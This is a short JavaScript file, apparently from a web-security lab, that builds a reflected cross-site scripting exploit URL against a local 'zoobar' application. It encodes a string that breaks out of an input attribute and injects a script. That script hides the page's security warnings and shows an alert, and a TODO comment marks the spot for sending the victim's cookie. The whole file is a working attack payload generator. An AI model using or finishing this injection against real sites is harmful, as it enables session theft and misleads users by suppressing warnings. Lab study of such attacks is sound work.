// this function will get injected using cross site scripting
// it has to have no dependencies
// and can not call any local functions
function icanhaz() {
    // TODO: send the cookie from here
    alert('hello');

    const warnings = document.getElementsByClassName('warning');
    window.addEventListener('load', (event) => {
        Array.prototype.forEach.call(warnings, (warning) => {
            warning.style.visibility = 'hidden';
        });
    });
}

function jsInjection(f) {
    const code = f.toString() + f.name + '();';
    return encodeURIComponent('" value size="10"><script>' + code + '</script><input type="hidden" ');
}

function exploit(f) {
    return 'http://localhost:8080/zoobar/index.cgi/users?user=' + jsInjection(f);
}

console.log(exploit(icanhaz));
